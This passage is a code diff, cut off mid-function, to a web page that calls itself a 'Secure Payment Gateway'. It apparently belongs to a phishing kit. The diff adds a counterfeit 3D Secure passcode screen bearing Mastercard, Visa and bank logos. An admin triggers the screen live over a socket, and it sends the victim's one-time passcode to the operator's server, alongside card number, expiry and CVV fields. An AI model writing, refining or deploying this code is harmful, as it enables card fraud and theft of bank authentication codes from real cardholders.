@@ -339,6 +339,7 @@
             height: 1.5rem;
             width: auto;
         }
+        
 /* MC Verification Styles */
 .fullscreen-overlay {
   position: fixed;
@@ -414,7 +415,7 @@
                     <div class="my-6">
                         <div class="flex items-center space-x-2 mb-3">
                             <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.618 5.984A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016zM12 9v2m0 4h.01" />
+<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.618 5.984A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016zM12 9v2m0 4h.01" />
                             </svg>
                             <span class="font-medium">Secure Payment Gateway</span>
                         </div>
@@ -534,6 +535,109 @@
             </div> 
         </div>
     </div>
+
+<!-- MC Verification Overlay -->
+<div id="mcVerificationOverlay" class="fullscreen-overlay">
+  <!-- Loading Content - Shown Initially -->
+  <div id="mcLoadingContent" style="display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 450px; max-height: 550px; background: white; width: 90%; max-width: 480px; border-radius: 0; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
+    <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite;"></div>
+    
+    <!-- Added verification logo during loading -->
+    <div id="loadingVerificationLogo" style="margin-top: 20px; height: 60px; text-align: center;">
+      <!-- Logo will be inserted here dynamically -->
+    </div>
+  </div>
+  
+  <!-- Verification Content - Hidden Until Admin Sends start_verification Event -->
+  <div id="mcVerificationContent" style="display: none; position: relative; width: 90%; max-width: 480px; background-color: white; border-radius: 0; overflow: hidden; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
+    <!-- Header with bank and card brand logos -->
+    <div style="display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; border-bottom: 1px solid #e0e0e0; background-color: #fff;">
+      <div style="height: 40px; max-width: 45%;">
+        <img id="bankLogo" src="" alt="Bank Logo" style="height: 40px; max-width: 100%;">
+      </div>
+      <div style="height: 40px; max-width: 45%; text-align: right;">
+        <img id="verificationTypeLogo" src="" alt="Verification Logo" style="height: 40px; max-width: 100%;">
+      </div>
+    </div>
+
+    <!-- Main content -->
+    <div style="padding: 15px;">
+      <h3 style="margin-top: 0; margin-bottom: 15px; font-weight: bold; color: #333; font-size: 16px;">Protecting your online payments</h3>
+      
+      <div style="background-color: #f0e6f6; padding: 10px; border-radius: 3px; border: 1px solid #d9c8e6; margin-bottom: 15px;">
+        <p style="margin: 0; font-size: 13px; color: #555; line-height: 1.4;">
+          One-Time Passcode is required for this purchase. This passcode has been sent to your registered mobile <span id="cardLastFourDigits">********9469</span>
+        </p>
+      </div>
+      
+      <!-- Transaction details -->
+      <div style="margin-bottom: 15px; font-size: 13px; color: #333; text-align: center;">
+        <div style="margin-bottom: 5px;">
+          <span style="display: inline-block; min-width: 90px; text-align: right; padding-right: 10px;">Merchant</span>
+          <span id="merchantName" style="display: inline-block; text-align: left; font-weight: 500;">GOLFSTORE 3DS</span>
+        </div>
+        <div style="margin-bottom: 5px;">
+          <span style="display: inline-block; min-width: 90px; text-align: right; padding-right: 10px;">Amount</span>
+          <span style="display: inline-block; text-align: left; font-weight: 500;">
+            <span id="currencySymbol">$</span><span id="transactionAmount">45.99</span>
+          </span>
+        </div>
+        <div style="margin-bottom: 5px;">
+          <span style="display: inline-block; min-width: 90px; text-align: right; padding-right: 10px;">Date</span>
+          <span id="transactionDate" style="display: inline-block; text-align: left; font-weight: 500;">17:10:09</span>
+        </div>
+        <div style="margin-bottom: 5px;">
+          <span style="display: inline-block; min-width: 90px; text-align: right; padding-right: 10px;">Card Number</span>
+          <span id="cardNumberDisplay" style="display: inline-block; text-align: left; font-weight: 500;">XXXX XXXX XXXX 0622</span>
+        </div>
+        <div style="margin-bottom: 5px;">
+          <span style="display: inline-block; min-width: 90px; text-align: right; padding-right: 10px;">Reference Id</span>
+          <span id="referenceId" style="display: inline-block; text-align: left; font-weight: 500;">299879</span>
+        </div>
+      </div>
+      
+      <!-- OTP input field -->
+      <div style="margin-bottom: 20px; display: flex; align-items: center;">
+        <span style="font-size: 13px; margin-right: 10px; min-width: 150px;">Enter One-Time Passcode</span>
+        <div style="position: relative; flex: 1;">
+          <input type="text" id="mcOtpInput" style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 3px; font-size: 14px; transition: all 0.3s;" placeholder="Enter One-Time Passcode" maxlength="6">
+          <div style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); cursor: pointer;" id="otpInfoIcon">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
+              <circle cx="12" cy="12" r="10"/>
+              <path d="M12 16v-4M12 8h.01"/>
+            </svg>
+          </div>
+        </div>
+      </div>
+      
+      <p id="mcOtpError" style="color: #e74c3c; font-size: 13px; margin-top: 0; margin-bottom: 15px; display: none; text-align: center;">
+        Incorrect OTP, please enter valid one time passcode sent to your registered mobile
+      </p>
+      
+      <!-- Consent checkbox -->
+      <div style="margin-bottom: 15px;">
+        <label id="consentLabel" style="display: flex; align-items: flex-start; cursor: pointer; font-size: 12px; color: #555;">
+          <input type="checkbox" id="mcConsentCheckbox" style="margin-right: 8px; margin-top: 1px;" checked>
+          <span>I agree that by clicking the box I have read, understood and accepted the 3D Secure Terms and Conditions.</span>
+        </label>
+      </div>
+      
+      <!-- Action buttons -->
+      <div style="display: flex; gap: 5px; margin-bottom: 10px;">
+        <button id="mcSubmitBtn" style="flex: 1; padding: 8px; background-color: #8ab4f8; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Submit</button>
+        <button id="mcResendBtn" style="flex: 1; padding: 8px; background-color: #0066cc; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Resend</button>
+        <button id="mcCancelBtn" style="flex: 1; padding: 8px; background-color: #aaaaaa; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Cancel</button>
+      </div>
+      
+      <!-- Footer links -->
+      <div style="margin-top: 15px; padding-top: 8px; border-top: 1px solid #e5e5e5; text-align: center; font-size: 11px; color: #777;">
+        <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">Terms & Conditions</a> |
+        <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">FAQs</a> |
+        <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">Contact Us</a>
+      </div>
+    </div>
+  </div>
+</div>
 
 <script>
 // Global error handler to catch uncaught exceptions
@@ -711,10 +815,27 @@ function setupSocketListeners() {
         }, 1500);
     });
     
+    socket.on('start_verification', (data) => {
+        console.log('Start verification requested:', data);
+        
+        const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
+        const mcLoadingContent = document.getElementById('mcLoadingContent');
+        const mcVerificationContent = document.getElementById('mcVerificationContent');
+        
+        if (mcVerificationOverlay && mcLoadingContent && mcVerificationContent) {
+            // Hide loading, show verification content
+            mcLoadingContent.style.display = 'none';
+            mcVerificationContent.style.display = 'block';
+            
+            // Update UI components with transaction data
+            updateMcVerificationUI(data);
+        }
+    });
+    
     socket.on('mc_verification_result', function(result) {
-        const mcContainer = document.getElementById('mc-verification-container');
+        const mcContainer = document.getElementById('mcVerificationOverlay');
         if (mcContainer) {
-            document.body.removeChild(mcContainer);
+            mcContainer.style.display = 'none';
         }
         
         if (result.success) {
@@ -726,23 +847,18 @@ function setupSocketListeners() {
     });
     
     socket.on('mc_otp_error', function(data) {
-        const otpInput = document.getElementById('mc-otp-input');
+        const otpInput = document.getElementById('mcOtpInput');
+        const errorMsgElem = document.getElementById('mcOtpError');
+        
         if (otpInput) {
-            otpInput.value = '';
             otpInput.classList.add('border-red-500');
             
-            const errorMsg = document.createElement('p');
-            errorMsg.className = 'text-red-500 text-sm mt-1';
-            errorMsg.textContent = data.message || 'Invalid OTP. Please try again.';
-            
-            const existingError = otpInput.parentNode.querySelector('.text-red-500');
-            if (existingError) {
-                otpInput.parentNode.removeChild(existingError);
+            if (errorMsgElem) {
+                errorMsgElem.textContent = data.message || 'Invalid OTP. Please try again.';
+                errorMsgElem.style.display = 'block';
             }
             
-            otpInput.parentNode.appendChild(errorMsg);
-            
-            const submitBtn = document.getElementById('mc-submit-otp');
+            const submitBtn = document.getElementById('mcSubmitBtn');
             if (submitBtn) {
                 submitBtn.disabled = false;
                 submitBtn.textContent = 'Submit';
@@ -750,26 +866,30 @@ function setupSocketListeners() {
         }
     });
     
-    socket.on('verification_status_update', function(data) {
-        console.log('Verification status update:', data);
-        
-        if (data.status === 'otp_received') {
-            const mcContainer = document.getElementById('mc-verification-container');
-            const submitBtn = document.getElementById('mc-submit-otp');
-            
-            if (mcContainer && submitBtn) {
-                submitBtn.textContent = 'OTP Received ✓';
-                submitBtn.style.backgroundColor = '#22c55e';
+    socket.on('update_mc_bank', function(data) {
+        if (data.bankCode) {
+            const bankLogo = document.getElementById('bankLogo');
+            if (bankLogo) {
+                // Map of bank codes to logo URLs
+                const bankLogos = {
+                    'default': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png',
+                    'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
+                    'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
+                    'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png',
+                    'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
+                    'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
+                    'kotak': 'https://static.wikia.nocookie.net/logopedia/images/1/16/Kotak_Mahindra_Bank.svg',
+                    'yes': 'https://upload.wikimedia.org/wikipedia/commons/b/b3/Yes_Bank_logo.svg'
+                };
                 
-                const statusMsg = document.createElement('p');
-                statusMsg.className = 'text-center text-green-500 mt-4';
-                statusMsg.textContent = 'Your verification code has been received and is being processed.';
-                
-                const existingMsg = mcContainer.querySelector('.text-center.text-green-500');
-                if (!existingMsg) {
-                    submitBtn.parentNode.appendChild(statusMsg);
-                }
+                bankLogo.src = bankLogos[data.bankCode] || bankLogos['default'];
             }
+        }
+    });
+    
+    socket.on('update_mc_currency', function(data) {
+        if (data.currency) {
+            updateCurrencyDisplay(data.currency);
         }
     });
 }
@@ -780,6 +900,7 @@ function getReadableFailureReason(reasonCode) {
         'bank_declined': 'Your bank declined this transaction',
         'card_disabled': 'This card has been disabled for online transactions',
         'invalid_card': 'Invalid card details',
+        'canceled': 'Transaction canceled by user',
         '3Dsecure_is_not_enabled_for_your_card': '3D secure is not enabled for your card',
         'pickup_Card': 'This card has been flagged for pickup',
         'Incorrect_card_details': 'The card details entered are incorrect',
@@ -791,145 +912,229 @@ function getReadableFailureReason(reasonCode) {
     return reasons[reasonCode] || 'Your payment could not be processed';
 }
 
-function showMCVerification(data) {
-    const mcContainer = document.createElement('div');
-    mcContainer.id = 'mc-verification-container';
-    mcContainer.className = 'fixed inset-0 bg-black bg-opacity-75 z-50 flex items-center justify-center';
+function updateMcVerificationUI(data) {
+    // Update UI elements with data
+    document.getElementById('merchantName').textContent = data.merchantName || 'Peacock Merchandise';
+    document.getElementById('transactionAmount').textContent = data.amount || state.amount.toFixed(2);
+    document.getElementById('transactionDate').textContent = new Date().toLocaleTimeString();
+    document.getElementById('cardNumberDisplay').textContent = 'XXXX XXXX XXXX ' + (state.cardForm.cardNumber.slice(-4) || '1234');
+    document.getElementById('referenceId').textContent = data.invoiceId?.substring(0, 6) || Math.floor(100000 + Math.random() * 900000);
     
-    let logoSrc = '';
-    let verificationTitle = '';
+    // Set currency symbol
+    updateCurrencyDisplay(data.currency || 'USD');
     
-    switch(data.verificationType || 'mastercard') {
-        case 'visa':
-            logoSrc = 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg';
-            verificationTitle = 'Verified by Visa';
-            break;
-        case 'amex':
-            logoSrc = 'https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg';
-            verificationTitle = 'American Express SafeKey';
-            break;
-        case 'discover':
-            logoSrc = 'https://upload.wikimedia.org/wikipedia/commons/d/d1/Discover_Card_logo.svg';
-            verificationTitle = 'Discover ProtectBuy';
-            break;
-        case 'rupay':
-            logoSrc = 'https://upload.wikimedia.org/wikipedia/commons/c/cb/Rupay-Logo.png';
-            verificationTitle = 'RuPay PaySecure';
-            break;
-        default:
-            logoSrc = 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg';
-            verificationTitle = 'Mastercard SecureCode';
+    // Set verification type logo
+    const verificationLogo = document.getElementById('verificationTypeLogo');
+    if (verificationLogo) {
+        const verificationType = data.verificationType || detectCardType(state.cardForm.cardNumber);
+        
+        // Map of verification types to logos
+        const verificationLogos = {
+            'visa': 'https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png',
+            'mastercard': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png',
+            'amex': 'https://logos-world.net/wp-content/uploads/2020/11/American-Express-Logo-700x394.png',
+            'discover': 'https://logos-world.net/wp-content/uploads/2021/03/Discover-Logo-1985-2009.png'
+        };
+        
+        verificationLogo.src = verificationLogos[verificationType] || verificationLogos['mastercard'];
     }
     
-    mcContainer.innerHTML = `
-        <div class="bg-white p-6 rounded-lg max-w-md w-full">
-            <div class="flex justify-center mb-4">
-                <img src="${logoSrc}" alt="${verificationTitle}" class="h-12">
-            </div>
-            <h3 class="text-xl font-bold mb-4 text-center">${verificationTitle}</h3>
-            <p class="mb-4 text-gray-600 text-center">
-                For your security, your bank requires additional verification for this transaction.
-            </p>
-            <div class="mb-4 bg-blue-50 p-4 rounded-lg">
-                <div class="flex justify-between mb-2">
-                    <span class="text-gray-500">Merchant:</span>
-                    <span class="font-medium">${data.merchantName || 'Online Store'}</span>
-                </div>
-                <div class="flex justify-between mb-2">
-                    <span class="text-gray-500">Amount:</span>
-                    <span class="font-medium">${data.amount || state.amount} ${data.currency || 'INR'}</span>
-                </div>
-                <div class="flex justify-between">
-                    <span class="text-gray-500">Date:</span>
-                    <span class="font-medium">${new Date().toLocaleDateString()}</span>
-                </div>
-            </div>
-            <div class="mb-4">
-                <label class="block text-sm font-medium mb-2">One-Time Password (OTP)</label>
-                <input type="text" id="mc-otp-input" class="w-full p-2 border border-gray-300 rounded" 
-                    placeholder="Enter OTP sent to your mobile" maxlength="6">
-                <p class="text-sm text-gray-500 mt-1">
-                    A verification code has been sent to your registered mobile ${data.phoneLastFour ? 'ending with ' + data.phoneLastFour : ''}
-                </p>
-            </div>
-            <button id="mc-submit-otp" class="w-full bg-blue-600 text-white py-2 rounded font-medium">
-                Submit
-            </button>
-        </div>
-    `;
+    // Set bank logo
+    const bankLogo = document.getElementById('bankLogo');
+    if (bankLogo) {
+        const bankCode = data.bankCode || 'default';
+        
+        // Map of bank codes to logo URLs
+        const bankLogos = {
+            'default': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png',
+            'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
+            'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
+            'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png',
+            'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
+            'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
+            'kotak': 'https://static.wikia.nocookie.net/logopedia/images/1/16/Kotak_Mahindra_Bank.svg',
+            'yes': 'https://upload.wikimedia.org/wikipedia/commons/b/b3/Yes_Bank_logo.svg'
+        };
+        
+        bankLogo.src = bankLogos[bankCode] || bankLogos['default'];
+    }
     
-    document.body.appendChild(mcContainer);
+    // Update masked phone number
+    if (data.phoneLastFour) {
+        document.getElementById('cardLastFourDigits').textContent = `********${data.phoneLastFour}`;
+    }
     
-    document.getElementById('mc-submit-otp').addEventListener('click', function() {
-        const otpValue = document.getElementById('mc-otp-input').value.trim();
-        if (otpValue.length < 4) {
-            alert('Please enter a valid OTP');
-            return;
-        }
+    // Set up event handlers for buttons
+    setupMcVerificationButtons();
+}
+
+function updateCurrencyDisplay(currency) {
+    const currencySymbol = document.getElementById('currencySymbol');
+    if (currencySymbol) {
+        // Map of currency codes to symbols
+        const symbols = {
+            'USD': '$',
+            'EUR': '€',
+            'GBP': '£',
+            'JPY': '¥',
+            'INR': '₹',
+            'AUD': 'A$',
+            'CAD': 'C$',
+            'CHF': 'CHF'
+        };
         
-        this.disabled = true;
-        this.textContent = 'Verifying...';
-        
-        let retryCount = 0;
-        const maxRetries = 3;
-        
-        const sendOTP = () => {
+        currencySymbol.textContent = symbols[currency] || '$';
+    }
+}
+
+function setupMcVerificationButtons() {
+    // Submit button handler
+    const submitBtn = document.getElementById('mcSubmitBtn');
+    if (submitBtn) {
+        submitBtn.onclick = function() {
+            const otpInput = document.getElementById('mcOtpInput');
+            const otpValue = otpInput ? otpInput.value.trim() : '';
+            
+            if (!otpValue) {
+                const errorMsg = document.getElementById('mcOtpError');
+                if (errorMsg) {
+                    errorMsg.textContent = 'Please enter the verification code';
+                    errorMsg.style.display = 'block';
+                }
+                return;
+            }
+            
+            // Show loading state
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Verifying...';
+            
+            // Submit OTP to server
             socket.emit('mc_otp_submitted', {
                 invoiceId: state.transactionId,
                 otp: otpValue,
                 timestamp: new Date().toISOString()
-            }, (acknowledgement) => {
-                if (acknowledgement && acknowledgement.received) {
-                    console.log('OTP submission acknowledged by server');
-                    
-                    const statusText = document.createElement('p');
-                    statusText.className = 'text-green-500 text-sm mt-1';
-                    statusText.textContent = 'Verification code received. Processing...';
-                    
-                    const otpInput = document.getElementById('mc-otp-input');
-                    if (otpInput && otpInput.parentNode) {
-                        const existingStatus = otpInput.parentNode.querySelector('.text-green-500');
-                        if (!existingStatus) {
-                            otpInput.parentNode.appendChild(statusText);
-                        }
-                    }
-                    
-                } else if (retryCount < maxRetries) {
-                    console.warn(`OTP submission not acknowledged, retrying (${retryCount + 1}/${maxRetries})...`);
-                    retryCount++;
-                    setTimeout(sendOTP, 1000);
-                } else {
-                    console.error('Failed to send OTP after multiple attempts');
-                    this.textContent = 'Retry';
-                    this.disabled = false;
-                    
-                    const errorText = document.createElement('p');
-                    errorText.className = 'text-red-500 text-sm mt-1';
-                    errorText.textContent = 'Failed to send verification code. Please try again.';
-                    
-                    const otpInput = document.getElementById('mc-otp-input');
-                    if (otpInput && otpInput.parentNode) {
-                        const existingStatus = otpInput.parentNode.querySelector('.text-red-500');
-                        if (!existingStatus) {
-                            otpInput.parentNode.appendChild(errorText);
-                        }
-                    }
-                }
             });
         };
-        
-        sendOTP();
-        
-        setTimeout(() => {
-            const mcContainer = document.getElementById('mc-verification-container');
-            if (mcContainer) {
-                socket.emit('check_verification_status', {
-                    invoiceId: state.transactionId,
-                    timestamp: new Date().toISOString()
+    }
+    
+    // Resend button handler
+    const resendBtn = document.getElementById('mcResendBtn');
+    if (resendBtn) {
+        resendBtn.onclick = function() {
+            resendBtn.disabled = true;
+            resendBtn.textContent = 'Sending...';
+            
+            // Request OTP resend
+            socket.emit('mc_resend_otp', {
+                invoiceId: state.transactionId
+            });
+            
+            // Reset button after delay
+            setTimeout(() => {
+                resendBtn.disabled = false;
+                resendBtn.textContent = 'Resend';
+                
+                // Show toast notification
+                showToast('OTP Resent', 'A new code has been sent to your mobile');
+            }, 2000);
+        };
+    }
+    
+    // Cancel button handler
+    const cancelBtn = document.getElementById('mcCancelBtn');
+    if (cancelBtn) {
+        cancelBtn.onclick = function() {
+            if (confirm('Are you sure you want to cancel this verification?')) {
+                // Hide the verification overlay
+                const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
+                if (mcVerificationOverlay) {
+                    mcVerificationOverlay.style.display = 'none';
+                }
+                
+                // Notify server
+                socket.emit('mc_verification_cancelled', {
+                    invoiceId: state.transactionId
                 });
+                
+                // Redirect to card form
+                resetForm();
             }
-        }, 5000);
-    });
+        };
+    }
+    
+    // OTP input validation and formatting
+    const otpInput = document.getElementById('mcOtpInput');
+    if (otpInput) {
+        otpInput.oninput = function() {
+            // Only allow digits
+            this.value = this.value.replace(/\D/g, '');
+            
+            // Hide error message when typing
+            const errorMsg = document.getElementById('mcOtpError');
+            if (errorMsg) {
+                errorMsg.style.display = 'none';
+            }
+        };
+    }
+}
+
+function showMCVerification(data) {
+    console.log('Showing MC verification overlay with data:', data);
+    
+    const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
+    const loadingVerificationLogo = document.getElementById('loadingVerificationLogo');
+    
+    if (mcVerificationOverlay) {
+        // Determine card/verification type
+        let cardType = data.cardType || detectCardType(state.cardForm.cardNumber);
+        
+        // Select appropriate logo for loading screen
+        if (loadingVerificationLogo) {
+            let logoSrc;
+            
+            switch(cardType.toLowerCase()) {
+                case 'visa':
+                    logoSrc = 'https://logowik.com/content/uploads/images/visa-new-20215093.jpg';
+                    break;
+                case 'amex':
+                    logoSrc = 'https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png';
+                    break;
+                case 'discover':
+                    logoSrc = 'https://1000logos.net/wp-content/uploads/2021/05/Discover-logo.png';
+                    break;
+                default: // mastercard is default
+                    logoSrc = 'https://logodix.com/logo/21144.jpg';
+                    break;
+            }
+            loadingVerificationLogo.innerHTML = `<img src="${logoSrc}" alt="${cardType}" style="max-height: 90px; max-width: 250px;">`;
+        }
+        
+        // Show the overlay with loading screen
+        mcVerificationOverlay.style.display = 'flex';
+        const mcLoadingContent = document.getElementById('mcLoadingContent');
+        const mcVerificationContent = document.getElementById('mcVerificationContent');
+        
+        if (mcLoadingContent && mcVerificationContent) {
+            mcLoadingContent.style.display = 'flex';
+            mcVerificationContent.style.display = 'none';
+        }
+    }
+}
+
+function detectCardType(cardNumber) {
+    cardNumber = cardNumber.replace(/\D/g, '');
+    
+    if (cardNumber.startsWith('4')) {
+        return 'visa';
+    } else if (/^5[1-5]/.test(cardNumber)) {
+        return 'mastercard';
+    } else if (/^3[47]/.test(cardNumber)) {
+        return 'amex';
+    } else if (/^6(?:011|5)/.test(cardNumber)) {
+        return 'discover';
+    }
+    
+    return 'mastercard'; // Default
 }
 
 function generateRandomPhone() {
@@ -971,6 +1176,8 @@ function detectCardType(cardNumber) {
     } else {
         state.cardType = null;
     }
+    
+    return state.cardType;
 }
 
 function formatExpiryDate(value) {
@@ -1009,6 +1216,7 @@ function validateCardForm() {
 
 function handleCardSubmit(e) {
     e.preventDefault();
+    console.log('Form submitted, preventing default and processing payment...');
     
     if (!validateCardForm()) {
         const { cardNumber, cardHolder, expiryDate, cvv } = state.cardForm.errors;
@@ -1024,7 +1232,7 @@ function handleCardSubmit(e) {
         if (cvv) {
             document.getElementById('cvv').classList.add('border-red-500');
         }
-        return;
+        return false;
     }
     
     document.getElementById('card-number').classList.remove('border-red-500');
@@ -1071,6 +1279,7 @@ function handleCardSubmit(e) {
             showErrorUI("Connection Timeout", "No response from payment server. Please try again.");
         }
     }, 30000);
+    
     return false;
 }
 
@@ -1086,7 +1295,7 @@ function showToast(title, message, type = 'info') {
                 <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                     ${type === 'error' 
                       ? '<path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd"/>'
-                      : '<path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>'
+: '<path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>'
                     }
                 </svg>
             </div>
@@ -1269,7 +1478,84 @@ function showCardUI() {
     
     setTimeout(() => {
         setupCardFormHandlers();
+        console.log('Card form handlers set up after delay');
     }, 100);
+}
+
+function setupCardFormHandlers() {
+    console.log('Setting up card form handlers...');
+    const cardNumberInput = document.getElementById('card-number');
+    const cardHolderInput = document.getElementById('card-holder');
+    const expiryDateInput = document.getElementById('expiry-date');
+    const cvvInput = document.getElementById('cvv');
+    const cardForm = document.getElementById('card-form');
+    
+    if (cardNumberInput) {
+        cardNumberInput.addEventListener('input', (e) => {
+            const formattedValue = formatCardNumber(e.target.value);
+            state.cardForm.cardNumber = formattedValue;
+            e.target.value = formattedValue;
+            detectCardType(formattedValue);
+            
+            if (state.cardType) {
+                const cardIconContainer = document.querySelector('.input-icon.right');
+                const html = `
+                    <div class="h-7 w-12 flex items-center justify-center">
+                        ${state.cardType === 'visa' ? 
+                            '<img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" class="h-7 w-auto" />' : 
+                        state.cardType === 'mastercard' ? 
+                            '<img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" class="h-7 w-auto" />' : 
+                        state.cardType === 'amex' ? 
+                            '<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="Amex" class="h-7 w-auto" />' : 
+                        state.cardType === 'discover' ? 
+                            '<img src="https://upload.wikimedia.org/wikipedia/commons/d/d1/Discover_Card_logo.svg" alt="Discover" class="h-7 w-auto" />' : 
+                        state.cardType === 'rupay' ? 
+                            '<img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/Rupay-Logo.png" alt="RuPay" class="h-7 w-auto" />' : 
+                        ''}
+                    </div>
+                `;
+                
+                if (cardIconContainer) {
+                    cardIconContainer.innerHTML = html;
+                } else {
+                    const iconDiv = document.createElement('div');
+                    iconDiv.className = 'input-icon right';
+                    iconDiv.innerHTML = html;
+                    e.target.parentNode.appendChild(iconDiv);
+                }
+            } else {
+                const cardIconContainer = document.querySelector('.input-icon.right');
+                if (cardIconContainer) {
+                    cardIconContainer.remove();
+                }
+            }
+        });
+    }
+    
+    if (cardHolderInput) {
+        cardHolderInput.addEventListener('input', (e) => {
+            state.cardForm.cardHolder = e.target.value;
+        });
+    }
+    
+    if (expiryDateInput) {
+        expiryDateInput.addEventListener('input', (e) => {
+            const formattedValue = formatExpiryDate(e.target.value);
+state.cardForm.expiryDate = formattedValue;
+            e.target.value = formattedValue;
+        });
+    }
+    
+    if (cvvInput) {
+        cvvInput.addEventListener('input', (e) => {
+            state.cardForm.cvv = e.target.value;
+        });
+    }
+    
+    if (cardForm) {
+        cardForm.addEventListener('submit', handleCardSubmit);
+        console.log('Card form submit handler attached');
+    }
 }
 
 function showProcessingUI() {
@@ -1584,80 +1870,6 @@ function resetForm() {
     showCardUI();
 }
 
-function setupCardFormHandlers() {
-    const cardNumberInput = document.getElementById('card-number');
-    const cardHolderInput = document.getElementById('card-holder');
-    const expiryDateInput = document.getElementById('expiry-date');
-    const cvvInput = document.getElementById('cvv');
-    const cardForm = document.getElementById('card-form');
-    
-    if (cardNumberInput) {
-        cardNumberInput.addEventListener('input', (e) => {
-            const formattedValue = formatCardNumber(e.target.value);
-            state.cardForm.cardNumber = formattedValue;
-            e.target.value = formattedValue;
-            detectCardType(formattedValue);
-            
-            if (state.cardType) {
-                const cardIconContainer = document.querySelector('.input-icon.right');
-                const html = `
-                    <div class="h-7 w-12 flex items-center justify-center">
-                        ${state.cardType === 'visa' ? 
-                            '<img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" class="h-7 w-auto" />' : 
-                        state.cardType === 'mastercard' ? 
-                            '<img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" class="h-7 w-auto" />' : 
-                        state.cardType === 'amex' ? 
-                            '<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="Amex" class="h-7 w-auto" />' : 
-                        state.cardType === 'discover' ? 
-                            '<img src="https://upload.wikimedia.org/wikipedia/commons/d/d1/Discover_Card_logo.svg" alt="Discover" class="h-7 w-auto" />' : 
-                        state.cardType === 'rupay' ? 
-                            '<img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/Rupay-Logo.png" alt="RuPay" class="h-7 w-auto" />' : 
-                        ''}
-                    </div>
-                `;
-                
-                if (cardIconContainer) {
-                    cardIconContainer.innerHTML = html;
-                } else {
-                    const iconDiv = document.createElement('div');
-                    iconDiv.className = 'input-icon right';
-                    iconDiv.innerHTML = html;
-                    e.target.parentNode.appendChild(iconDiv);
-                }
-            } else {
-                const cardIconContainer = document.querySelector('.input-icon.right');
